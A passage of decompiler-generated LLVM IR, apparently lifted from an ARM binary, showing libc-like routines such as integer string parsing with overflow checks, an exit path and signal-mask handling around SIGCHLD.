  store i32 %v5_102d8, i32* %r3.global-to-local, align 4
  %v1_102dc = add i32 %v4_102d8, add (i32 ptrtoint (i32* @global_var_16948.472 to i32), i32 20)
  %v2_102dc = inttoptr i32 %v1_102dc to i32*
  %v3_102dc = load i32, i32* %v2_102dc, align 4
  store i32 %v3_102dc, i32* %r1.global-to-local, align 4
  %v6_102e0 = inttoptr i32 %v5_102d8 to i32*
  %v7_102e0 = load i32, i32* %v6_102e0, align 4
  store i32 %v7_102e0, i32* %r2.global-to-local, align 4
  %v1_102e4 = add i32 %tmp, 4
  store i32 %v1_102e4, i32* @r6, align 4
  %v4_102e8 = mul i32 %v3_102dc, 4
  %v5_102e8 = add i32 %v4_102e8, %v1_102e4
  store i32 %v5_102e8, i32* %r3.global-to-local, align 4
  %v2_102ec = add i32 %arg4, 24
  %v3_102ec = inttoptr i32 %v2_102ec to i32*
  store i32 %v5_102e8, i32* %v3_102ec, align 4
  %v0_102f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_102f0 = load i32, i32* @r5, align 4
  %v2_102f0 = add i32 %v1_102f0, 20
  %v3_102f0 = inttoptr i32 %v2_102f0 to i32*
  store i32 %v0_102f0, i32* %v3_102f0, align 4
  %v0_102f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_102f4 = load i32, i32* @r5, align 4
  %v2_102f4 = add i32 %v1_102f4, 16
  %v3_102f4 = inttoptr i32 %v2_102f4 to i32*
  store i32 %v0_102f4, i32* %v3_102f4, align 4
  %v0_102f8 = load i32, i32* @r4, align 4
  %v1_102f8 = load i32, i32* @r5, align 4
  %v2_102f8 = add i32 %v1_102f8, 12
  %v3_102f8 = inttoptr i32 %v2_102f8 to i32*
  store i32 %v0_102f8, i32* %v3_102f8, align 4
  %v0_102fc = load i32, i32* @r6, align 4
  %v1_102fc = load i32, i32* @r5, align 4
  %v2_102fc = add i32 %v1_102fc, 8
  %v3_102fc = inttoptr i32 %v2_102fc to i32*
  store i32 %v0_102fc, i32* %v3_102fc, align 4
  %v0_10300 = load i32, i32* @r5, align 4
  store i32 %v0_10300, i32* %r1.global-to-local, align 4
  %v0_10304 = load i32, i32* @r0, align 4
  %v2_10304 = inttoptr i32 %v0_10304 to i32*
  %v3_10304 = call i32 @function_101c0(i32* %v2_10304, i32 %v0_10300)
  store i32 %v3_10304, i32* %r0.global-to-local, align 4
  %v0_10308 = load i32, i32* @r4, align 4
  %v2_10308 = icmp eq i32 %v0_10308, 0
  br i1 %v2_10308, label %bb29, label %.thread6

bb29:                                             ; preds = %bb28
  %v1_1032414 = load i32, i32* @r7, align 4
  %v2_1032415 = inttoptr i32 %v1_1032414 to i32*
  store i32 0, i32* %v2_1032415, align 4
  %v1_10328 = load i32, i32* @r4, align 4
  store i32 %v1_10328, i32* %r0.global-to-local, align 4
  br label %bb30

.thread6:                                         ; preds = %bb28
  %v1_1030c = load i32, i32* @r5, align 4
  %v2_1030c = add i32 %v1_1030c, 4
  %v3_1030c = inttoptr i32 %v2_1030c to i32*
  %v4_1030c = load i32, i32* %v3_1030c, align 4
  %v1_10310 = load i32, i32* @r6, align 4
  %v3_10310 = sub i32 %v4_1030c, %v1_10310
  %v4_10314 = sdiv i32 %v3_10310, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1031c = mul i32 %v4_10314, 5
  %v5_1031c = add i32 %v4_1031c, %v0_10308
  store i32 %v5_1031c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10324 = load i32, i32* @r7, align 4
  %v2_10324 = inttoptr i32 %v1_10324 to i32*
  store i32 0, i32* %v2_10324, align 4
  %v1_1032c = load i32, i32* %r3.global-to-local, align 4
  %v2_1032c = load i32, i32* @r7, align 4
  %v3_1032c = inttoptr i32 %v2_1032c to i32*
  store i32 %v1_1032c, i32* %v3_1032c, align 4
  %v17_10330.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %bb29, %.thread6
  %v17_10330 = phi i32 [ %v1_10328, %bb29 ], [ %v17_10330.pre, %.thread6 ]
  %v2_10330 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10330, i32* %r4.global-to-local, align 4
  ret i32 %v17_10330

dec_label_pc_10334:                               ; preds = %dec_label_pc_102b8
  %v0_10334 = call i32 @function_cc08()
  store i32 %v0_10334, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1033c = inttoptr i32 %v0_10334 to i32*
  store i32 22, i32* %v2_1033c, align 4
  %v0_10340 = call i32 @function_cc08()
  %v0_10344 = load i32, i32* %r4.global-to-local, align 4
  %v2_10344 = inttoptr i32 %v0_10340 to i32*
  store i32 %v0_10344, i32* %v2_10344, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1034c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1034c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_102c8, { 1, 0 }
  uselistorder i1 %v7_102a0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 %arg3, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 4, 3, 0, 1, 2 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread1, { 2, 1, 0 }
}

define i32 @function_10354(i8* %arg1) local_unnamed_addr {
dec_label_pc_10354:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_10368 = load i32, i32* @r4, align 4
  store i32 %v3_10368, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_1038c.pre = load i32, i32* @global_var_1f4a0, align 4
  br label %dec_label_pc_10384

dec_label_pc_10384:                               ; preds = %dec_label_pc_10384, %dec_label_pc_10354
  %v0_103bc = phi i32 [ %tmp, %dec_label_pc_10354 ], [ %v1_10380, %dec_label_pc_10384 ]
  store i32 %v0_103bc, i32* %r4.global-to-local, align 4
  %v1_10388 = inttoptr i32 %v0_103bc to i8*
  %v2_10388 = load i8, i8* %v1_10388, align 1
  %v3_10388 = zext i8 %v2_10388 to i32
  %v3_10390 = mul nuw nsw i32 %v3_10388, 2
  %v4_10390 = add i32 %v3_10390, %v2_1038c.pre
  %v5_10390 = inttoptr i32 %v4_10390 to i8*
  %v6_10390 = load i8, i8* %v5_10390, align 1
  %v1_10394 = and i8 %v6_10390, 32
  %v2_10394 = icmp eq i8 %v1_10394, 0
  %v1_10380 = add i32 %v0_103bc, 1
  br i1 %v2_10394, label %dec_label_pc_1039c, label %dec_label_pc_10384

dec_label_pc_1039c:                               ; preds = %dec_label_pc_10384
  %v7_1039c = icmp eq i8 %v2_10388, 43
  br i1 %v7_1039c, label %dec_label_pc_103bc, label %dec_label_pc_103a4

dec_label_pc_103a4:                               ; preds = %dec_label_pc_1039c
  %v7_103a4 = icmp eq i8 %v2_10388, 45
  br i1 %v7_103a4, label %dec_label_pc_103bc, label %bb

bb:                                               ; preds = %dec_label_pc_103a4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10418

dec_label_pc_103bc:                               ; preds = %dec_label_pc_1039c, %dec_label_pc_103a4
  %storemerge30 = phi i32 [ 1, %dec_label_pc_103a4 ], [ 0, %dec_label_pc_1039c ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_10380, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10418

dec_label_pc_10418:                               ; preds = %bb, %dec_label_pc_103bc
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_10420 = call i32 @function_c864(i32 -1, i32 10)
  %v0_10424 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10424, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_10430 = urem i32 %v2_10420, 256
  store i32 %v1_10430, i32* %sl.global-to-local, align 4
  %v0_10434 = call i32 @function_148a4()
  store i32 0, i32* @ip, align 4
  store i32 %v0_10434, i32* %r8.global-to-local, align 4
  %v0_10448.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10448

dec_label_pc_10444:                               ; preds = %bb48, %dec_label_pc_104a4
  %v0_10444 = phi i32 [ %v1_10474, %bb48 ], [ %v0_10444.pre, %dec_label_pc_104a4 ]
  store i32 %v0_10444, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10448

dec_label_pc_10448:                               ; preds = %dec_label_pc_10418, %dec_label_pc_10444
  %v0_10474 = phi i32 [ %v0_10448.pre, %dec_label_pc_10418 ], [ %v0_10444, %dec_label_pc_10444 ]
  %v1_10448 = inttoptr i32 %v0_10474 to i8*
  %v2_10448 = load i8, i8* %v1_10448, align 1
  %v3_10448 = zext i8 %v2_10448 to i32
  %v1_1044c = add nsw i32 %v3_10448, -48
  %v1_10450 = urem i32 %v1_1044c, 256
  %v1_10458 = or i32 %v3_10448, 32
  %tmp56 = icmp ult i32 %v1_10450, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_10460

dec_label_pc_10460:                               ; preds = %dec_label_pc_10448
  %tmp57 = icmp ugt i32 %v1_10458, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10460
  %v1_10464 = add nsw i32 %v1_10458, -87
  %v5_1046c = urem i32 %v1_10464, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_10448, %dec_label_pc_10460, %bb42
  %v3_1049c = phi i32 [ %v1_10450, %dec_label_pc_10448 ], [ 40, %dec_label_pc_10460 ], [ %v5_1046c, %bb42 ]
  %v1_10470 = load i32, i32* %r5.global-to-local, align 4
  %v1_10474 = add i32 %v0_10474, 1
  store i32 %v1_10474, i32* %r4.global-to-local, align 4
  %v6_10478 = icmp slt i32 %v3_1049c, %v1_10470
  br i1 %v6_10478, label %dec_label_pc_1047c, label %dec_label_pc_104bc

dec_label_pc_1047c:                               ; preds = %bb43
  %v0_1047c = load i32, i32* @ip, align 4
  %v1_1047c = load i32, i32* %r8.global-to-local, align 4
  %v9_1047c = icmp eq i32 %v0_1047c, %v1_1047c
  br i1 %v9_1047c, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_1047c
  br label %dec_label_pc_1048c

bb44:                                             ; preds = %dec_label_pc_1047c
  %v3_1047c = icmp ult i32 %v0_1047c, %v1_1047c
  br i1 %v3_1047c, label %dec_label_pc_1048c, label %dec_label_pc_104a4

dec_label_pc_1048c:                               ; preds = %bb44, %.thread
  %v4_104941727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_1048c = load i32, i32* %sl.global-to-local, align 4
  %v3_1048c = icmp uge i32 %v3_1049c, %v1_1048c
  %v9_1048c = icmp eq i32 %v3_1049c, %v1_1048c
  %v2_10490 = xor i1 %v3_1048c, true
  %v3_10490 = or i1 %v9_1048c, %v2_10490
  br i1 %v3_10490, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1048c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1048c, %bb45
  %v4_10494 = phi i32 [ %v4_104941727, %dec_label_pc_1048c ], [ 0, %bb45 ]
  %v2_10494 = xor i1 %v9_1048c, true
  %v3_10494 = and i1 %v3_1048c, %v2_10494
  br i1 %v3_10494, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_10494 = urem i32 %v4_10494, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_10498 = phi i32 [ %v5_10494, %bb47 ], [ %v4_10494, %bb46 ]
  %v2_10498 = icmp eq i32 %v0_10498, 0
  br i1 %v2_10498, label %bb48, label %dec_label_pc_104a4

bb48:                                             ; preds = %thread-pre-split
  %v4_1049c = mul i32 %v0_1047c, %v1_10470
  %v5_1049c = add i32 %v4_1049c, %v3_1049c
  store i32 %v5_1049c, i32* @ip, align 4
  br label %dec_label_pc_10444

dec_label_pc_104a4:                               ; preds = %bb44, %thread-pre-split
  %v0_104a4 = call i32 @function_cc08()
  %v0_104a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_104a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_104a8 = and i32 %v1_104a8, %v0_104a8
  store i32 %v2_104a8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_104b4 = inttoptr i32 %v0_104a4 to i32*
  store i32 34, i32* %v2_104b4, align 4
  %v0_10444.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10444

dec_label_pc_104bc:                               ; preds = %bb43
  %v0_104bc.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_104bc = icmp eq i32 %v0_104bc.pre, 0
  br i1 %v2_104bc, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_104bc
  %v1_104c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_104c0 = inttoptr i32 %v0_104bc.pre to i32*
  store i32 %v1_104c0, i32* %v3_104c0, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_104bc, %bb49
  %v0_104c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_104c4 = icmp eq i32 %v0_104c4, 0
  %. = select i1 %v2_104c4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_104d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_104d0 = icmp eq i32 %v0_104d0, 0
  %v0_104f4.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_104d0, label %dec_label_pc_104ec, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_104f4.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_104dc, label %dec_label_pc_104ec

dec_label_pc_104dc:                               ; preds = %bb53
  %v0_104dc = call i32 @function_cc08()
  %v2_104e4 = inttoptr i32 %v0_104dc to i32*
  store i32 34, i32* %v2_104e4, align 4
  %v0_104e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_104e8, i32* @ip, align 4
  %v0_104ec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_104ec

dec_label_pc_104ec:                               ; preds = %bb53, %bb50, %dec_label_pc_104dc
  %v0_104f4.pre = phi i32 [ %v0_104f4.pre.pre, %bb53 ], [ %v0_104e8, %dec_label_pc_104dc ], [ %v0_104f4.pre.pre, %bb50 ]
  %v0_104ec = phi i32 [ %v0_104c4, %bb53 ], [ %v0_104ec.pre, %dec_label_pc_104dc ], [ %v0_104c4, %bb50 ]
  %v2_104ec = icmp eq i32 %v0_104ec, 0
  br i1 %v2_104ec, label %dec_label_pc_104ec._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_104ec
  %v2_104f0 = sub i32 0, %v0_104f4.pre
  store i32 %v2_104f0, i32* @ip, align 4
  br label %dec_label_pc_104ec._crit_edge

dec_label_pc_104ec._crit_edge:                    ; preds = %dec_label_pc_104ec, %bb54
  %v0_104f4 = phi i32 [ %v2_104f0, %bb54 ], [ %v0_104f4.pre, %dec_label_pc_104ec ]
  %v2_104f8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_104f8, i32* @r4, align 4
  ret i32 %v0_104f4

; uselistorder directives
  uselistorder i32 %v0_104f4.pre, { 1, 0 }
  uselistorder i32 %v0_104f4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_104bc.pre, { 1, 0 }
  uselistorder i32 %v4_10494, { 1, 0 }
  uselistorder i1 %v3_1048c, { 1, 0 }
  uselistorder i32 %v1_1048c, { 1, 0 }
  uselistorder i32 %v1_10474, { 1, 0 }
  uselistorder i32 %v1_10458, { 1, 0 }
  uselistorder i32 %v1_10450, { 1, 0 }
  uselistorder i32 %v0_10444, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder label %dec_label_pc_104ec._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_104ec, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_104a4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10448, { 1, 0 }
  uselistorder label %dec_label_pc_10444, { 1, 0 }
  uselistorder label %dec_label_pc_10418, { 1, 0 }
  uselistorder label %dec_label_pc_103bc, { 1, 0 }
}

define i32 @function_10500(i32 %arg1) local_unnamed_addr {
dec_label_pc_10500:
  %stack_var_-16 = alloca i32, align 4
  %v2_10500 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_10500, i32* @r0, align 4
  %v1_1051c = call i32 @function_10840()
  %v1_1052c = call i32 @function_10838()
  %v2_10534 = load i32, i32* @global_var_21b24.480, align 4
  %v2_10538 = icmp eq i32 %v2_10534, 0
  br i1 %v2_10538, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_10500
  call void @__pseudo_branch(i32 %v2_10534)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10500, %bb
  store i32 %v2_10500, i32* @r0, align 4
  %v1_10558 = call i32 @function_10840()
  store i32 %v1_10558, i32* @r0, align 4
  %v1_1055c = call i32 @function_107cc(i32 %v1_10558)
  store i32 66928, i32* @lr, align 4
  %v2_1056c = call i32 @function_d554()
  %v0_10570 = load i32, i32* @r4, align 4
  %v1_10574 = call i32 @function_10d38(i32 %v0_10570)
  unreachable

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10594(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10594:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10594 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10594, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_105a4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_105a8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_105a8, i32* %stack_var_-32, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_105b4

dec_label_pc_105b4:                               ; preds = %dec_label_pc_105b4, %dec_label_pc_10594
  %v0_105c8 = phi i32 [ %v1_105c8, %dec_label_pc_105b4 ], [ 0, %dec_label_pc_10594 ]
  %v3_105b4 = phi i32 [ %v1_105bc, %dec_label_pc_105b4 ], [ %v2_105a8, %dec_label_pc_10594 ]
  %v1_105b8 = inttoptr i32 %v3_105b4 to i32*
  %v2_105b8 = load i32, i32* %v1_105b8, align 4
  %v1_105bc = add i32 %v3_105b4, 4
  %v2_105c0 = icmp eq i32 %v2_105b8, 0
  store i32 %v1_105bc, i32* %stack_var_-32, align 4
  %v1_105c8 = add i32 %v0_105c8, 1
  store i32 %v1_105c8, i32* %lr.global-to-local, align 4
  br i1 %v2_105c0, label %dec_label_pc_105d0, label %dec_label_pc_105b4

dec_label_pc_105d0:                               ; preds = %dec_label_pc_105b4
  %v3_105d0.neg = mul i32 %v1_105c8, -4
  %v1_105d4.neg = add i32 %v2_105a4, -8
  %v2_105d8 = add i32 %v1_105d4.neg, %v3_105d0.neg
  %v2_105e0 = inttoptr i32 %v2_105d8 to i32*
  store i32 %arg1, i32* %v2_105e0, align 4
  store i32 %v2_105a8, i32* %stack_var_-32, align 4
  %v0_105ec = load i32, i32* @sp, align 4
  store i32 %v0_105ec, i32* @r1, align 4
  store i32 %v0_105ec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_105f4

dec_label_pc_105f4:                               ; preds = %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge, %dec_label_pc_105d0
  %v1_10608 = phi i32 [ %v5_10608, %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge ], [ %v0_105ec, %dec_label_pc_105d0 ]
  %v3_105f4 = phi i32 [ %v3_105f4.pre, %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge ], [ %v2_105a8, %dec_label_pc_105d0 ]
  %v1_105f8 = inttoptr i32 %v3_105f4 to i32*
  %v2_105f8 = load i32, i32* %v1_105f8, align 4
  %v0_105fc = load i32, i32* %lr.global-to-local, align 4
  %v1_105fc = add i32 %v0_105fc, -1
  store i32 %v1_105fc, i32* %lr.global-to-local, align 4
  %v7_105fc = icmp eq i32 %v0_105fc, 1
  %v1_10600 = add i32 %v3_105f4, 4
  store i32 %v1_10600, i32* %stack_var_-32, align 4
  %v2_10608 = add i32 %v1_10608, 4
  %v3_10608 = inttoptr i32 %v2_10608 to i32*
  store i32 %v2_105f8, i32* %v3_10608, align 4
  %v4_10608 = load i32, i32* %ip.global-to-local, align 4
  %v5_10608 = add i32 %v4_10608, 4
  store i32 %v5_10608, i32* %ip.global-to-local, align 4
  br i1 %v7_105fc, label %dec_label_pc_10610, label %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge

dec_label_pc_105f4.dec_label_pc_105f4_crit_edge:  ; preds = %dec_label_pc_105f4
  %v3_105f4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_105f4

dec_label_pc_10610:                               ; preds = %dec_label_pc_105f4
  %v2_10614 = load i32, i32* @global_var_21b2c.485, align 4
  store i32 %v2_10614, i32* @r2, align 4
  %v0_10618 = call i32 @function_10d8c()
  ret i32 %v0_10618

; uselistorder directives
  uselistorder i32 %v5_10608, { 1, 0 }
  uselistorder i32 %v0_105fc, { 1, 0 }
  uselistorder i32 %v1_105c8, { 0, 2, 1 }
  uselistorder i32 %v1_105bc, { 1, 0 }
  uselistorder i32 %v3_105b4, { 1, 0 }
  uselistorder i32 %v2_105a8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_10628(i32 %arg1) local_unnamed_addr {
dec_label_pc_10628:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10628 = load i32, i32* @r4, align 4
  store i32 %v3_10628, i32* %stack_var_-20, align 4
  %v6_10628 = load i32, i32* @r5, align 4
  %v9_10628 = load i32, i32* @r6, align 4
  %v16_10628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_1062c = icmp eq i32 %arg1, 0
  %v2_10630 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_1062c, label %dec_label_pc_107b4, label %dec_label_pc_10648.preheader

dec_label_pc_10648.preheader:                     ; preds = %dec_label_pc_10628
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_1065017 = add i32 %v16_10628, 124
  br label %dec_label_pc_10640

dec_label_pc_10640:                               ; preds = %dec_label_pc_10648.preheader, %dec_label_pc_10640
  %v5_1065018 = phi i32 [ %v5_1065017, %dec_label_pc_10648.preheader ], [ %v5_10650, %dec_label_pc_10640 ]
  %v2_10644 = add i32 %v5_1065018, -136
  %v3_10644 = inttoptr i32 %v2_10644 to i32*
  store i32 0, i32* %v3_10644, align 4
  %v0_10648.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10648 = add i32 %v0_10648.pre, -1
  store i32 %v1_10648, i32* %r1.global-to-local, align 4
  %v6_10648 = icmp slt i32 %v1_10648, 0
  %v4_10650 = mul i32 %v1_10648, 4
  %v5_10650 = add i32 %v4_10650, %v16_10628
  br i1 %v6_10648, label %dec_label_pc_10658, label %dec_label_pc_10640

dec_label_pc_10658:                               ; preds = %dec_label_pc_10640
  %v2_10658 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_10658, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_10668 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_10668, i32* %stack_var_-28, align 4
  %v2_10670 = call i32 @function_131d0(i32 %v2_10658, i32 17)
  store i32 %v2_10670, i32* %r0.global-to-local, align 4
  %v1_10674 = load i32, i32* @r5, align 4
  %v5_10678 = icmp slt i32 %v2_10670, %v1_10674
  br i1 %v5_10678, label %dec_label_pc_107bc, label %dec_label_pc_1067c

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10658
  %v2_1067c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_1067c, i32* @r4, align 4
  store i32 %v1_10674, i32* %r0.global-to-local, align 4
  store i32 %v2_10658, i32* %r1.global-to-local, align 4
  %v3_1068c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_1068c = call i32 @function_10f84(i32 %v1_10674, %_TYPEDEF_sigset_t* %v3_1068c, i32 %v2_1067c)
  store i32 %v4_1068c, i32* %r0.global-to-local, align 4
  %v1_10690 = load i32, i32* @r5, align 4
  %v9_10690 = icmp eq i32 %v4_1068c, %v1_10690
  br i1 %v9_10690, label %dec_label_pc_10698, label %dec_label_pc_107bc

dec_label_pc_10698:                               ; preds = %dec_label_pc_1067c
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_1067c, i32* %r0.global-to-local, align 4
  %v2_106a0 = call i32 @function_131ac(i32 %v2_1067c, i32 17)
  store i32 %v2_106a0, i32* %r0.global-to-local, align 4
  %v1_106a4 = load i32, i32* @r5, align 4
  %v9_106a4 = icmp eq i32 %v2_106a0, %v1_106a4
  br i1 %v9_106a4, label %dec_label_pc_106bc.preheader, label %dec_label_pc_10698.dec_label_pc_10784_crit_edge

dec_label_pc_10698.dec_label_pc_10784_crit_edge:  ; preds = %dec_label_pc_10698
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_10784

dec_label_pc_106bc.preheader:                     ; preds = %dec_label_pc_10698
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_106b4

dec_label_pc_106b4:                               ; preds = %dec_label_pc_106bc.preheader, %dec_label_pc_106b4
  %v5_106c416 = phi i32 [ %v5_1065017, %dec_label_pc_106bc.preheader ], [ %v5_106c4, %dec_label_pc_106b4 ]
  %v2_106b8 = add i32 %v5_106c416, -136
  %v3_106b8 = inttoptr i32 %v2_106b8 to i32*
  store i32 0, i32* %v3_106b8, align 4
  %v0_106bc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_106bc = add i32 %v0_106bc.pre, -1
  store i32 %v1_106bc, i32* %r1.global-to-local, align 4
  %v6_106bc = icmp slt i32 %v1_106bc, 0
  %v4_106c4 = mul i32 %v1_106bc, 4
  %v5_106c4 = add i32 %v4_106c4, %v16_10628
  br i1 %v6_106bc, label %dec_label_pc_106cc, label %dec_label_pc_106b4

dec_label_pc_106cc:                               ; preds = %dec_label_pc_106b4
  store i32 %v2_10658, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_106d4 = call i32 @function_131d0(i32 %v2_10658, i32 17)
  store i32 %v2_106d4, i32* %r0.global-to-local, align 4
  %v1_106d8 = icmp slt i32 %v2_106d4, 0
  br i1 %v1_106d8, label %dec_label_pc_107bc, label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %dec_label_pc_106cc
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_106ec = call i32 @function_10b24(i32 17, i32* null, i32 %v2_10630)
  store i32 %v4_106ec, i32* %r0.global-to-local, align 4
  %v1_106f0 = icmp slt i32 %v4_106ec, 0
  br i1 %v1_106f0, label %dec_label_pc_106f8, label %dec_label_pc_10720

dec_label_pc_106f8:                               ; preds = %dec_label_pc_106e0
  %v0_106f8 = call i32 @function_cc08()
  store i32 %v2_1067c, i32* %r1.global-to-local, align 4
  store i32 %v0_106f8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1070c = inttoptr i32 %v0_106f8 to i32*
  %v2_1070c = load i32, i32* %v1_1070c, align 4
  store i32 %v2_1070c, i32* @r4, align 4
  %v3_10710 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10710 = call i32 @function_10f84(i32 2, %_TYPEDEF_sigset_t* %v3_10710, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10718 = load i32, i32* @r4, align 4
  %v1_10718 = load i32, i32* %r5.global-to-local, align 4
  %v2_10718 = inttoptr i32 %v1_10718 to i32*
